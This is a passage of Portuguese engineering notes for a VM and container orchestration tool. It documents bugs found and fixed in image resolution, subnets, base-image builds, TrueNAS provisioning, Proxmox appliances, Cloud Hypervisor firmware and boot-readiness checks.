  URI) — `grep -c` sobre nada devolve `0`, que se lê como «não tem cdrom». Um zero que vem de uma
  medição falhada não é um zero.

**Resíduo fechado a seguir: a recusa era contornável pelo CAMINHO.** O MESMO appliance com o mesmo
`hostname:`/`sshKeys:` recusava por `disk: opnsense:26.1` e era **aceite** por
`disk: /…/vm-images/opnsense_26.1.qcow2` — rc=0, `ensured`, e o `seed.iso` outra vez anexado. E o
caminho absoluto é precisamente o contorno que alguém tenta depois de levar `image not found` com o
nome, ou seja: a verificação era furada pela jogada que o próprio bug anterior ensinava. Os defaults
da imagem tinham a mesma assimetria. **`resolve_image_ref` passou a fazer a busca inversa** — se o
`store.get` falhar e a referência for um caminho, procura a entrada do store cujo qcow2 É esse
ficheiro (`image_at_path`, canonicalizado dos dois lados, o mesmo idioma do `vms_backed_by` a um
ficheiro de distância). Devolve **`qcow2_path(nome)` e não o caminho canónico**, para as duas
grafias darem a MESMA string: duas strings para a mesma imagem lêem-se como deriva, e uma deriva de
`Vm` é um `Replace`, que deita fora o overlay. Um qcow2 **fora** do store continua a resolver-se a
si próprio sem metadados — não é lacuna, é o que se sabe dele: nada neste host regista o que um
disco arbitrário é, logo não há flag de appliance para ler nem defaults para aplicar. Validado ao
vivo com `DELONIX_ROOT` isolado (as duas grafias recusam com o mesmo texto); a igualdade das duas
strings resolvidas é prova de **teste unitário** e não ao vivo — fabricar um registo de VM à mão
para ver o plano deu um `vm ls` vazio (o store salta em silêncio um JSON a que faltem campos), e um
proxy que falha não é medição.

## A subnet de uma rede passou a valer, e o que isso abriu (v0.47.0)

Pedido: poder passar CIDRs ao criar VMs/redes (`vpc_cidr`, `public_subnets_cidr`,
`private_subnets_cidr`, `single_nat_gateway` — o vocabulário do módulo VPC do Terraform), para
que uma VM OPNsense faça de firewall de uma infra de rede gerida sem quebrar o ingress/egress
nativo.

**O primeiro degrau era um bug, não uma feature**: `--subnet` e `spec.subnet` eram aceites e
deitados fora com o driver `bridge` — o único que o rootless realiza. O `create_with_base`
existia para isso, dizia-o no doc-comment, e tinha **zero chamadores** (5.ª ocorrência do padrão).
Ver o commit `net: a subnet de uma rede passa a valer`. Fechou de caminho uma **deriva eterna no
reconciler**: `RECONCILED_NETWORK_FIELDS` já comparava `subnet`, logo um manifesto com `subnet:`
dava plano `-/+` a cada `stack plan` e o apply nunca o resolvia.

**E abriu uma SEGUNDA, que só a bateria E2E apanhou (2026-08-13).** Ao ganhar a forma `cidr=`, o
`NetworkStore::get` passou a ter um ramo que devolvia de dentro do ciclo das linhas — e o que
ficava por correr era a passagem que lê os `label.`/`annotation.`. Ou seja **uma rede com `cidr=`
voltava sem posse**: o `stack apply` carimbava `delonix.io/stack`, o `get` seguinte deitava-o
fora, o plano dizia `exists and belongs to no stack — will be taken over`, e o
`--detailed-exitcode` respondia **2** sobre um manifesto que ninguém tocou. Um gate de deriva em
CI vermelho todos os dias, no caso mais comum que há (`kind: Network` com `subnet:`). O `cidr`
continua a ganhar sobre o `base=`; o que mudou é que os labels são aplicados antes de devolver.
**Lição de método**: o bug estava a um `git blame` de distância do trabalho que o introduziu, e
nenhum teste unitário lhe chegou — foi o CICLO (apply → plan) contra o binário real que o mostrou,
o que é exactamente a razão de o `scripts/e2e.sh` existir. Correr a bateria faz parte de fechar um
ciclo, não é opcional.

**O que o espaço de endereçamento permite, e porquê**: o registo de uma rede guarda UM OCTETO,
não um CIDR; tudo o resto (bridge, gateway `.0.1`, range do IPAM) é derivado. Daí `10.<200-254>.
0.0/16` e nada mais — `172.20.0.0/16` ou um `/20` exigem mudar o formato do registo e o IPAM.
A recusa nomeia sempre a forma que funciona.

**NO-GO medido, com controlo: o OPNsense não arranca em Cloud Hypervisor.** Nem com o
`rust-hypervisor-fw` (fica a enumerar PCI, guest nunca sobe) nem com o **EDK2 `CLOUDHV.fd`** do
fork oficial (`gh release download --repo cloud-hypervisor/edk2`) — nos dois casos zero entradas
ARP no holder e 100% de perda. **O controlo é o que torna isto uma conclusão e não um palpite**:
a golden Linux, com o MESMO EDK2, responde em ~15s. Logo o firmware e a plumbing estão bons e o
problema é o guest FreeBSD. Como o CH é a única via de pôr uma VM na SDN do holder (com libvirt a
VM vive na `virbr0`, noutro netns), **o OPNsense não pode hoje ser gateway dos containers por essa
via** — a alternativa é `vm bridge` (privilegiado, EXPERIMENTAL, já validado E2E).

**Achado lateral que corrige uma nota desactualizada**: este documento dizia que a golden k8s é
«libvirt-only (não há hypervisor-fw)». Com o EDK2 `CLOUDHV.fd` ela **arranca em Cloud Hypervisor**
— medido nesta sessão, IP na SDN em ~15s.

**Porque é que `single_nat_gateway` é recusado e não aceite-como-no-op**: num nó só não há AZs
onde espalhar NAT gateways, e uma rede é uma bridge plana, não um conjunto de subnets roteadas.
Aceitá-lo seria repetir exactamente o bug que esta mesma sessão encontrou. `vpcCidr`/
`publicSubnets`/`privateSubnets`/`singleNatGateway` dão erro que diz o que existe aqui, antes do
genérico «unknown field — check the spelling» (quem escreve `singleNatGateway` não errou a
escrita; tem um modelo mental que não mapeia).

**O ponto técnico para quem continuar** (subnets pública/privada + OPNsense como gateway): hoje
TUDO o que sai leva masquerade em `oifname "tap0"`. Se as cargas privadas passarem a sair por um
gateway-appliance, o masquerade tem de acontecer **nele** e não antes — senão vê todo o tráfego
com um IP só e as regras por-origem dele deixam de valer. As chains por-workload (`fwcont`) são
FILTRO, não NAT, por isso compõem-se bem: o delonix decide se o pacote sai do workload, o
appliance decide o que atravessa a fronteira.

## Imagens base de SO, e o que o host precisa para as construir (v0.47.0)

Cinco variantes do `--no-k8s`: Ubuntu 24.04/26.04, Debian bookworm, Rocky 9 e **Fedora** (novo).
O Fedora é da família dnf/RPM do Rocky e o código diz isso em vez de o repetir — há teste a
comparar os passos gerados para os dois campo a campo.

**`--fedora-release` exige `<release>-<build>` (`42-1.1`) e recusa um `42` nu.** Medido: o nome do
artefacto carrega um build que a versão não determina, e o redirector do Fedora não serve listagem
de directório. Sem forma fiável de o descobrir, um `42` sozinho parece certo e dá 404 já com
centenas de MB transferidos — pergunta-se em vez de adivinhar (mesmo princípio dos inputs de ISO
no workflow das appliances).

**Dois bloqueios de host, e nenhum se adivinha pelo erro que dá** (agora ambos tratados por
`install.sh --with-image-build`):

- **Sem `isc-dhcp-client` NO HOST**, o appliance do supermin nasce sem cliente DHCP — o
  `supermin.d/packages` pede-o e o supermin só COPIA do host. O build morre em «Temporary failure
  resolving 'archive.ubuntu.com'», um erro que parece de rede do host, e o host tem rede.
- **`/boot/vmlinuz-*` a `0600`** (hardening do Debian/Ubuntu): o supermin copia o kernel do host
  para o appliance e morre em `cp: cannot open ... Permission denied`. O `chmod 0644` **baixa uma
  fronteira** (o binário do kernel passa a ser legível por qualquer utilizador local), por isso é
  opt-in, avisa e diz como reverter — o mesmo tratamento do `--low-ports`.

**`install.sh --production`** aplica os limites que só se atingem em CARGA, cada um por um modo de
falha concreto: `nf_conntrack_max` (todo o dataplane é nftables com conntrack — cheio, o kernel
DROPA ligações novas e do lado da aplicação parece perda aleatória), `neigh gc_thresh` (a tabela
ARP tem 1024 entradas e um nó denso enche-a), `ip_local_port_range` (cada ligação saínte por NAT
gasta uma porta efémera), `pid_max`/`file-max`/backlogs/`swappiness`. O **`hashsize` do conntrack
vai por `modprobe.d` porque NÃO é um sysctl** — subir só o max alonga as cadeias do hash em vez de
escalar. `LimitNOFILE`/`TasksMax` vão para um drop-in do `user@.service`: em rootless os
containers são filhos dele, e os limites de uma sessão PAM/SSH não lhes chegam.

**Dois bugs reais apanhados a construir**, ambos com teste de regressão:

1. **O `stream_download` não tinha retry nenhum.** A cloud image do Rocky (646 MiB) morreu aos
   3,8 MiB e a corrida seguinte recomeçava do zero (o `download_*_base` só verifica o ficheiro
   FINAL). Passa a pedir `Range:` a partir do que está em disco, com 5 tentativas; um 206 é
   retomado e um servidor que ignore o Range recomeça — a distinção é explícita, porque anexar a
   um corpo completo produziria lixo silencioso. O que torna isto seguro é o **checksum que todos
   os chamadores já verificam**: bytes costurados de dois ranges ou dão o hash publicado ou o
   download é descartado. Provado ao vivo: `resuming download at 3964627 bytes`.
2. **O reset de `machine-id` quebrava o build no Fedora**: `/var/lib/dbus` não existe lá, o
   `ln -sf` falhava e levava o `virt-customize` inteiro — a imagem não chegava a existir por causa
   de um symlink de compatibilidade. Mesma classe da armadilha do AppArmor no Rocky. `mkdir -p`
   antes do link.

**`image vm ls`/`ls-remote` passaram a dizer o que a imagem É.** O `ls` ganhou `TYPE`
(`cloud-init`/`appliance`) e `DEFAULTS` (`4cpu/8G`) — as duas coisas que decidem se o `vm create`
semeia a imagem (e portanto se `--ssh-key` é aceite ou recusado) e com que recursos arranca. O
`ls-remote` deixou de imprimir só a coluna TAG: lê o manifesto de cada tag (um GET, sem blob) e
mostra distro/tipo/tamanho das annotations; uma tag cujo manifesto falhe aparece na mesma com `-`.
O `KERNEL` é agora preenchido também num `import`, por `virt-ls /boot` — e **falha por razão
estrutural** no OPNsense (FreeBSD) e no TrueNAS (raiz em ZFS), onde o libguestfs não vê `/boot`;
no Proxmox VE funciona (`vmlinuz-6.17.2-1-pve`, medido).

## Provisionar armazenamento numa NAS (`kind: Volume` + `spec.provision`, ADR-0009)

Até aqui um `kind: Volume` com `nfs:` sabia **montar** uma partilha e exigia que alguém a tivesse
feito à mão. O bloco `provision.truenas` (OPCIONAL — sem ele este Kind comporta-se exactamente como
antes) cria o dataset, a quota, o dono/modo e o export. **A montagem não muda**: o `server` e o
`share` são DERIVADOS do que a appliance reportou e seguem o `share_mount`/`ensure_mounted` de
sempre — não há um segundo mecanismo de montagem. Crate próprio `delonix-truenas`; o
`delonix-volume` não ganha dependência DIRECTA (a árvore transitiva fica idêntica — as 9 linhas de
`reqwest`/`hyper`/`tokio` que ela já tinha chegam via `opentelemetry-otlp`, e escrever «o crate de
motor continua limpo de reqwest» seria falso).

**Exercitado contra uma appliance TrueNAS SCALE 25.10.5 REAL** (a que este repo constrói), e são os
achados do alvo real que moldam o desenho:

- **Há operações que são jobs assíncronos.** `POST /filesystem/setperm` responde `99` — um id, não
  um resultado. Tratar esse número como sucesso é reportar permissões aplicadas antes de acontecer
  o que quer que seja, e um job que falha fá-lo depois, onde ninguém está a olhar.
- **O endpoint de permissões MUDOU**: `/pool/dataset/permission/id/{id}` é 404 na 25.10, agora é
  `/filesystem/setperm`. É a razão concreta de o cliente **pinar um major** (`SUPPORTED_MAJOR`) em
  vez de ser liberal.
- **A quota tem um MÍNIMO de 1 GiB** — 512 MiB devolve um 422 com três constraints do pydantic.
  Validado do nosso lado antes de qualquer pedido, e **recusado em vez de arredondado**.
- **As propriedades numéricas são objectos cujo número pode ser `null`**: sem quota vem
  `{"parsed": null, "rawvalue": "0"}`. Ler a string transformaria «sem limite» em «limite de zero
  bytes» — a mesma distinção do `Usage { bytes, unreadable }`. **A quota é sempre RELIDA da NAS**,
  nunca ecoada do pedido, e é o valor relido que o apply imprime.

**Caminho destrutivo** (`volumes rm --destroy-remote`): o default NUNCA destrói o remoto. A posse é
um carimbo — `delonix.io/provisioned-by` nas anotações do volume, escrito pelo mesmo `set_metadata`
que o reconciliador já usa para o `last-applied`, sem registo novo. Sem carimbo não há o que
destruir e o comando di-lo. O carimbo leva **só referências** (url, dataset, o NOME do segredo); a
credencial é resolvida de novo na hora de destruir, logo uma chave rodada funciona. **A ordem é o
remoto primeiro e o registo local em último** — o registo é a única coisa que diz QUAL dataset em
QUAL appliance pertence a este volume, e apagá-lo à frente deixaria um dataset órfão sem nada a
apontar-lhe (a regra que a auditoria dos 208 subcomandos deixou escrita).

**Passagem `delonix-runtime-sec`, três achados, dois com exploit reproduzido:**

1. **Pânico remoto no caminho de ERRO** — os resumos de resposta fatiavam a String por índice de
   BYTE; um corte dentro de um carácter multi-byte entra em pânico (medido: 159 bytes de ASCII mais
   um `é`). Como o corpo vem do outro lado, qualquer servidor transformava um erro num crash — no
   código que existe para REPORTAR o que correu mal. `truncate_chars` recua até à fronteira.
2. **A URL levava a credencial para onde quer que fosse.** O `url:` vem do manifesto e nomeia para
   onde o segredo é ENVIADO. Que seja configurável é inerente (como o registo de um `docker login`),
   mas passam a ser recusadas duas formas sem uso legítimo: **`http://` com credencial** (ia em
   claro) e **userinfo na URL** (uma password no manifesto com outro nome, e a maneira clássica de
   uma URL se LER como um host e ALCANÇAR outro).
3. **A adopção não se via.** O `ensure_dataset` alinha a quota do que ENCONTRAR: um manifesto que
   nomeie `tank/producao` re-limita silenciosamente um dataset que não é dele. Nada do lado da NAS
   marca um dataset como nosso, logo não se pode impedir aqui — mas passa a **avisar**, que é a
   diferença entre um comportamento documentado e uma surpresa.

**Cenário de caos `truenas_destroy`** (salta com linha audível sem `DELONIX_CHAOS_TRUENAS_URL/USER/
PASS`), e cada passo consulta a NAS por HTTP em vez de acreditar no que a CLI diz que fez.
Verificado pela regra do repo: `if destroy_remote` → `if true` faz falhar «um rm normal destruiu o
dataset na NAS»; tirar a exigência do carimbo faz falhar «--destroy-remote aceitou um volume sem
provisionamento».

**Bug do próprio desenho, apanhado a validar**: um `provision:` sem `share:` provisiona o dataset e
não exporta nada — e derivava-se um bloco `nfs:` na mesma, a tentar montar um export nunca
publicado. O `Provisioned` passou a dizer se exportou.

**Limitação do host, não do código**: `mount -t nfs` precisa de CAP_SYS_ADMIN, por isso num rootless
puro o apply de um volume NFS falha no mount (comportamento pré-existente). É por isso que o relato
do provisionamento sai **antes** do mount — um apply que morresse ali tendo já criado dataset, quota
e export deixava o operador sem saber que fora criada seja o que for.

**Por fazer**: `cifs:`/SMB (só NFS é provisionado); criar a pool (é decisão de layout de discos
físicos, não de um manifesto de volume); e um segundo alvo (o bloco é nomeado pelo destino, logo
entra como chave irmã, não como um `type:` a manter sincronizado).


## Os appliances Proxmox, e o que «OK» não prova (2026-08-11)

Dois defeitos nas quatro imagens Proxmox publicadas, os dois encontrados a
ARRANCAR uma imagem e a olhar para ela — não a ler código:

1. **Levavam um IP ESTÁTICO do ambiente de build.** O `source = "from-dhcp"` do
   answer file quer dizer «obtém a configuração por DHCP DURANTE a instalação e
   grava-a como estática», não «usa DHCP no boot». Uma VM arrancada por
   `delonix vm create --backend libvirt` subia com `10.0.2.15` — o endereço do
   slirp do QEMU — e ficava inalcançável. A consola do próprio convidado
   anunciava-o (`https://10.0.2.15:8006/`); andei cinco iterações a adivinhar
   (nome da interface, config de rede) antes de olhar. **`--vnc` +
   `virsh screenshot` é a ferramenta para isto**, e deu a resposta em 30s.
2. **Sem `console=ttyS0`**, um convidado que falhe a rede não é observável de
   todo sem dispositivo gráfico — que é o que fez a diagnose do defeito 1
   demorar uma hora.

`scripts/appliances/proxmox_postinstall.py` (SSH + pexpect, na janela em que o
endereço antigo ainda é válido) reescreve o `interfaces` para DHCP, força
`net.ifnames=0` (**o DHCP sozinho não chega**: a bridge nomeia uma porta física,
e `ens18` num hypervisor é `enp0s3` no seguinte — `eth0` é o único nome
verdadeiro em todo o lado), acrescenta a consola série com getty, e regenera as
host keys do SSH no 1.º boot (foram geradas no build, logo todas as imagens
apresentariam a MESMA identidade).

**Três erros meus nesta série, e os três são da mesma família — afirmar sem
medir:**

- **`dpkg-reconfigure openssh-server` fica pendurado** (a unit ficou em
  `activating` para sempre) e, enquanto pendura, o sshd não tem host keys e
  RECUSA arrancar. Um passo de endurecimento que derruba o serviço é pior que a
  exposição que fechava. `ssh-keygen -A` faz o mesmo num instante.
- **PBS/PMG/PDM não trazem cliente DHCP.** O instalador configura estático e
  nunca precisa de um; escrever `inet dhcp` sem `dhclient` dá uma bridge que
  sobe, com o `eth0` lá dentro, e **zero IPv4** — enquanto o
  `networking.service` reporta `Finished`. O PVE funciona porque, sendo
  hypervisor, traz o cliente: **validei um dos quatro e generalizei**. O
  post-install passa a garantir o cliente e a **falhar fechado** se não o
  conseguir instalar.
- **O meu script de correcção dizia `OK` a olhar para o `rc` do post-install, e
  não para o resultado.** Era o relato desonesto que este repo persegue, escrito
  por mim. Um script que corrige imagens tem de as ARRANCAR e confirmar o que
  interessa (IP por DHCP numa rede que não a do build, e o serviço a responder)
  antes de substituir seja o que for — e não substituir quando falha.

**Regra que fica**: uma correcção de imagem só está feita quando a imagem
corrigida arranca noutro ambiente que não aquele onde foi corrigida. O `rc` de
um script de build não é evidência de nada.

**E a armadilha que custou mais tempo de todas, porque a correcção estava
certa**: depois de um `systemctl poweroff` por SSH, o script esperava
`sleep 12` e capturava o disco. **O SSH a fechar é o convidado a despedir-se,
não a máquina a parar** — o `qemu-img convert` corria sobre uma imagem ainda
aberta e capturava um filesystem a meio de ser escrito. Resultado: imagens que
arrancavam e nunca chegavam à rede, para uma correcção que estava boa. Três
hipóteses erradas antes de a encontrar (nome de interface, `/sbin/dhclient`,
bridge sem membro), e a que acertou foi comparar o ciclo que PASSOU com o que
falhou, em vez de olhar mais uma vez para dentro do convidado — que estava
sempre bem. **Esperar por tempo em vez de por condição, na operação que captura
o resultado.** O `build-proxmox.sh` já fazia `wait $QEMU_PID` e estava correcto;
o erro era só dos scripts ad-hoc com `-daemonize` + `sleep`.


## `--vnc` decidia se a VM tinha ECRÃ, e não só se tinha VNC (2026-08-11)

Bug do MOTOR, e o mais caro de atribuir de toda esta série porque parecia ser
das imagens. O `<video>` do XML só era emitido quando `--vnc` estava presente —
o que confunde duas coisas diferentes: **VNC é acesso remoto a um ecrã; VGA é a
máquina TER um.** Um domínio sem adaptador de vídeo nenhum é atípico (um
`virt-install` simples dá sempre um) e há convidados que não arrancam sem ele.

**Medido, e a medição é que resolveu a atribuição de culpa**: TODAS as imagens
Proxmox — incluindo a ORIGINAL do fabricante, que este repo nunca tocou —
entram num ciclo `SeaBIOS → GRUB → reset` sob `qemu -vga none`, sem imprimirem
uma única linha de kernel. Com adaptador, a MESMA imagem arranca e ganha lease
DHCP. Portanto: não era o `console=tty0`, não era o `dhclient`, não era a
bridge, não era o `sleep` da captura.

**A consequência é a pior espécie**: `delonix vm create <appliance>` funcionava
COM `--vnc` e produzia uma máquina que reiniciava em silêncio sem ele. A flag
que uma pessoa usa para OLHAR para o convidado era o que o fazia funcionar.

O default passa a ser `virtio` num domínio com VNC (como antes, byte a byte) e o
`vga` simples nos outros — não precisa de driver no convidado, que é o que
interessa quando ninguém se vai ligar e o adaptador existe só para o firmware e
o kernel encontrarem consola. `video: none` continua a suprimi-lo.

**A lição de método, e é a que custou horas**: validei quatro imagens com
`--vnc` porque me era conveniente para depurar, e essa flag era exactamente o
que mascarava o defeito. **O teste que vale é o comando que o utilizador
escreve** — não o que é cómodo para quem está a investigar. Cinco hipóteses
erradas (nome de interface, `/sbin/dhclient`, bridge sem membro, captura com o
guest vivo, `console=tty0`) antes de comparar duas invocações que só diferiam
numa flag.


## O `--wait` de uma VM CH esperava por um número que já sabia (2026-08-12)

Medido, e o número é o achado: `vm create --backend cloud-hypervisor --network lab-net --wait
--boot-timeout 120` devolvia em **0,062 s** com `✓ VM 'x' is up.` e `vm 'x' is up — ip
10.233.254.141`, enquanto a consola série mostrava o firmware a falhar antes de qualquer kernel, o
overlay ficava em 448 KiB (o SO nunca escreveu nada), o processo girava a 100% de CPU e o
`ip neigh` desse endereço, de um container na mesma SDN, dava `FAILED`.

A causa não é um bug do IP: em CH o endereço é DERIVADO do MAC (`infra::dhcp_lease_ip`), e isso é
deliberado — é o que permite pôr o endereço de uma VM debaixo do isolamento de namespace no
`vm_attach`, antes de o convidado existir para o pedir. O bug é o `--wait` ter tomado esse número
por resposta. **Ter um IP só é a resposta toda onde o IP foi OBSERVADO**; em libvirt vem de um
lease real (logo prova que o convidado arrancou o suficiente para o pedir), em CH é aritmética.

- **Quem sabe é o backend**: `VmBackend::ip_is_predicted()` (default `false`, CH devolve `true`),
  em vez de um `backend.contains("cloud-hypervisor")` no sítio da chamada — a razão do ADR-0008.
  Teste que exige os dois em desacordo, para um backend novo não herdar a resposta errada.
- **`infra::sdn_reachable`** pergunta de DENTRO do netns do holder, que é o único sítio onde a SDN
  existe. **ARP e não ICMP**: um appliance que deita fora pings tem de responder ARP pelo seu
  próprio endereço, ou não usava a rede de todo; e o iproute2 já é dependência dura deste motor,
  ao contrário do `ping`. `ip neigh replace … nud probe` obriga o kernel a solicitar e a assentar
  em `REACHABLE` ou `FAILED`; em `FAILED` re-arma, porque «ainda não» é a resposta normal enquanto
  um convidado arranca. **Medido ao vivo**: host real → `REACHABLE` em <0,5 s; endereço livre no
  mesmo /16 → `PROBE` durante ~3 s e depois `FAILED` — é por causa deste atraso que a sonda corre
  em fatias de 2 s dentro do ciclo, com o `--boot-timeout` a mandar.
- **`None` ≠ `Some(false)`**: sem holder ou sem `ip(8)` a pergunta não se PÔDE fazer, e aí a CLI
  diz `ip {ip}, which could not be verified from here` em vez de escolher uma das duas.
- **`✓ VM 'x' is up.` passou a `started.`** — nesse ponto o que aconteceu foi um processo VMM
  existir. Quem tem direito a dizer «is up» é o `--wait`, depois de ir ver.

**Validado ao vivo**: o repro passou de 0,062 s/`is up` para 26 s e `is running but never answered
at 10.233.254.162 — that address is computed from the MAC, not observed`; e o caminho libvirt (IP
observado) ficou intacto, `is up — ip 192.168.122.77` em 15,6 s sem sondar nada.

**Por decidir, e deliberadamente não mexido**: um `--wait` que esgota o tempo continua a sair
**0**. Era o comportamento anterior para o caso «ainda a arrancar» e mudá-lo por arrasto tornaria
um script silenciosamente diferente; mas um `--wait` que não viu a VM a responder e devolve
sucesso é da mesma família de relato desonesto, e merece a sua própria decisão.

### O firmware do CH: nenhuma imagem arrancava, e era isso que o `--wait` tapava

Encontrado a fechar a validação do ponto acima. Com o **`rust-hypervisor-fw`** que o `install.sh`
punha, **nenhuma imagem deste projecto arranca em Cloud Hypervisor**: as `delonix-vm-base:*` não
passam do firmware, e a golden `delonix-vm-k8s:1.34` morre no shim de Secure Boot
(`import_mok_state() failed: Unsupported`, lido na consola série) sem chegar ao kernel. Com o
**EDK2 `CLOUDHV.fd`** (fork `cloud-hypervisor/edk2`, asset `releases/latest/download/CLOUDHV.fd`)
arrancam e ganham IP na SDN — medido: ubuntu-24.04 **7,8 s**, ubuntu-26.04 e debian-bookworm
**5 s**, rocky-9 **32 s**, golden **7 s**.

- **O instalador passa a buscar os dois** e o motor prefere o EDK2 —
  `delonix_vm::DEFAULT_CH_FIRMWARES`, com teste a exigir a ORDEM. Um host que tenha ambos e
  escolha o `hypervisor-fw` volta ao silêncio de origem, e é o pior silêncio que há: processo a
  correr, registo a dizer `Running`, convidado sem ter executado uma instrução. O
  `rust-hypervisor-fw` fica como recurso (~150 KB, mais rápido onde funcione, e tirá-lo mudaria o
  comportamento de uma VM que hoje dependa dele).
- **Num host já instalado o firmware não aparece sozinho**: `sudo curl -fsSL -o
  /usr/local/share/delonix/CLOUDHV.fd https://github.com/cloud-hypervisor/edk2/releases/latest/download/CLOUDHV.fd`
  (ou correr o `install.sh` outra vez). Sem checksum publicado a montante, tal como o
  `cloud-hypervisor-static` e o `hypervisor-fw` — o mesmo risco já documentado e aceite.
- **Corrige duas notas deste ficheiro**. A que dizia que a golden é «libvirt-only» já estava
  corrigida em parte; o que faltava era que o problema NUNCA foi da imagem, era do firmware
  instalado — e vale para todas, não só para a golden. E o caso `Some(true)` da sonda, que a
  secção acima dava por provado só contra um container, **está agora provado através de uma VM**:
  `is up — ip 10.233.254.177` em 7,8 s, confirmado à parte por ARP (`REACHABLE` com o MAC real do
  convidado), pelo kernel na consola série, e por 3/3 ICMP de um container na mesma rede.
- **`delonix-vm-base:fedora-42` continua a não arrancar em CH, e isso não é do backend nem da
  imagem**: o GRUB anuncia `Booting 'Fedora Linux (6.14.0-63.fc42.x86_64)'` e o EDK2 leva um `#PF`
  de escrita a carregar o kernel — igual com `CLOUDHV_EFI.fd`, igual com 2 GiB, e **igual com a
  imagem ORIGINAL do fabricante** (mesmo RIP). Ver a secção seguinte: a parte que era nossa eram
  outras duas coisas, e a linha que aqui dizia «em libvirt também não ganha IP, logo é da imagem»
  estava errada por método — media-se «não ganha IP» e concluía-se «não arranca».

## O Fedora arrancava sempre; o que não tinha era rede (2026-08-12)

Três problemas empilhados, e o primeiro passo que valeu foi um **screenshot da consola** (30 s de
trabalho, `virsh screenshot` + `Read` da imagem): mostrava a VM no prompt de login. Toda a
conclusão anterior — «a imagem não arranca» — vinha de medir um proxy (não ganha IP) e chamar-lhe
a coisa. Mesma armadilha que o `--vnc` já tinha pregado à série das appliances.

1. **As imagens SELinux saíam do build sem etiquetas — e isto atinge o Rocky também.** Qualquer
   `dnf install` dentro do `virt-customize` re-corre o `ldconfig`, e o `/etc/ld.so.cache`
   reescrito volta **sem xattr de SELinux nenhum**. O `virt-customize` 1.52 relabela por omissão e
   imprime `SELinux relabelling`, mas num convidado Fedora esse passo demora **0,1 s**: não
   relabela, agenda (`/.autorelabel`). E o relabel de primeiro arranque nunca corre, porque a essa
   altura o PID 1 já está a ser negado (`avc: denied { map } … path="/etc/ld.so.cache"
   scontext=init_t tcontext=unlabeled_t`). Sem `ld.so.cache` legível não há `dbus-broker`; sem
   D-Bus não há NetworkManager; sem NetworkManager a interface fica DOWN e o hostname `localhost`.
   **195 negações num arranque**, e de fora via-se só uma VM sem lease. O relabel passa a correr no
   BUILD, como ÚLTIMO passo, dentro do `customize_args` — o único ponto por onde os dois caminhos
   de build passam, e o único onde um passo acrescentado depois não lhe pode passar à frente e
   voltar a estragar as etiquetas. Guardado em shell e não por distro: o caminho do VMfile constrói
   a partir de um `FROM` que pode ser um URL, onde não há nada fiável em que ramificar.
   **Duas coisas que só a reconstrução revelou**: (a) `setfiles /` NÃO chega — com a raiz sozinha o
   `/home/delonix` fica `unlabeled_t` (o `/home` do Fedora é subvolume próprio), o que dá duas
   negações por login e um `login` que nem entra na home, e não é cosmético porque o `--ssh-key`
   escreve `~/.ssh/authorized_keys`; os mountpoints passam a sair do `/etc/fstab` do convidado,
   que é ele a declarar a sua própria disposição. (b) a partição EFI tem de ser excluída **por
   TIPO** (vfat não tem xattr → `Operation not supported` → exit≠0 → build chumbado, nas duas
   distros); filtrar pelo tipo e não pelo caminho faz o mesmo por qualquer outro sistema de
   ficheiros sem etiquetas.
2. **O `network-config` do seed casava a NIC por NOME, com um glob.** `match: {name: "e*"}`
   funciona onde o renderer é o netplan (Ubuntu/Debian) e está partido onde é o NetworkManager
   (Fedora/Rocky) — o código do cloud-init decide-o numa linha: `if … not
   self.config.has_option(if_type, "mac-address"): self.config["connection"]["interface-name"] =
   iface["name"]`. Sem MAC, o renderer nomeia a interface a partir da CHAVE do netplan, e o
   convidado ficava com `interface-name=eth-all` — um dispositivo que nunca existe. Passa a casar
   por **MAC** (`delonix_vm::mac_for`, agora `pub`, o mesmo valor que os dois backends carimbam):
   é a única coisa da NIC conhecida antes de o convidado existir, e é o que faz o renderer omitir
   o `interface-name`. **Âmbito reduzido de propósito**: o glob também dava DHCP às `extraNics`,
   isto nomeia a primária — a que o DNS, o isolamento e o `vm ssh` usam.
3. **Em CH o GRUB do Fedora falha no EDK2, e é a montante** — provado com a imagem original do
   fabricante. **Arranque directo de kernel funciona**, com flags que já existem
   (`--kernel`/`--initrd`/`--cmdline`), e foi validado: `is up` em 24 s, com ARP do convidado
   confirmado no holder. O `vmlinuz`/`initramfs` saem com `virt-copy-out /boot/...` e o
   `root=`/`rootflags=` estão na entrada BLS de `/boot/loader/entries/*.conf`. Automatizá-lo tem
   perguntas próprias (onde fica o kernel extraído; o que acontece quando o convidado actualiza o
   dele) e não se fez às pressas.

**Ferramenta que ficou**: `scripts/`-nada — um `console.py` de sessão (pty + `virsh console`) que
corre comandos numa VM sem terminal, aproveitando o autologin série que o nosso `user-data` já
configura. Foi o que deu as respostas todas depois do screenshot; a arqueologia offline com
`guestfish` só serviu para confirmar.

**Reconstruídas e validadas ao vivo (2026-08-12)**: `delonix-vm-base:fedora-42` (libvirt) e
`delonix-vm-base:rocky-9` (cloud-hypervisor) — hostname aplicado, interface UP com endereço,
`dbus-broker`/NetworkManager activos, home em `~`, SELinux `Enforcing` e **0 AVC**. Falta a
republicação no ghcr (uma passagem do `vm-image.yml`).

**O host precisa de dois contornos para construir com `--network`, e nenhum deles é do motor.**
Estão os dois no `tool_failure_hint`, e foram ambos precisos nesta sessão:
1. O AppArmor do passt recusa o `$XDG_RUNTIME_DIR` que o libguestfs usa →
   `XDG_RUNTIME_DIR=/tmp/delonix-run`.
2. O passt empacotado no Ubuntu 24.04 é velho demais: **arranca e nunca dá lease**, o `dhclient`
   pendura os 300 s e o build SEGUE SEM REDE. O que se vê no fim é o gestor de pacotes a não
   resolver um mirror, sem a palavra `passt` em lado nenhum — por isso a dica não disparava, e
   lia-se como «o teu DNS está partido». O `[ 30x.x ]` no passo que falha é a pista: mais nada
   num build pára exactamente cinco minutos. A dica passa a reconhecer também a falha de DNS.
   Remédio: compilar o passt actual **e pô-lo PRIMEIRO no PATH** — o libguestfs procura-o por
   `passt --help`, logo compilá-lo não chega. E **não** o tentes desligar com um stub que falha:
   medido, o libguestfs usa o stub como helper real e morre nele; ausente cai no slirp do qemu,
   presente-e-partido não.

## `delonix_net::Net` foi APAGADO — e é breaking para quem usa a biblioteca

O `pub struct Net` («The Delonix network manager») foi removido: 22 métodos
públicos, 986 linhas, **zero chamadores no workspace**. Não era descuido, era
uma arquitectura anterior ao holder — o `Net::attach_on` corria `ip link add` e
`nft` DIRECTAMENTE no processo chamador, enquanto o caminho vivo
(`infra::attach_container`) pede o mesmo ao holder pelo socket de controlo. Em
rootless não podia funcionar; com privilégio mexia na rede do HOST, fora do
isolamento. Mesma conclusão, e mesmo destino, que o `publish_port_allow`.

**Zero chamadores no workspace não é o critério todo, e isto é a nota que
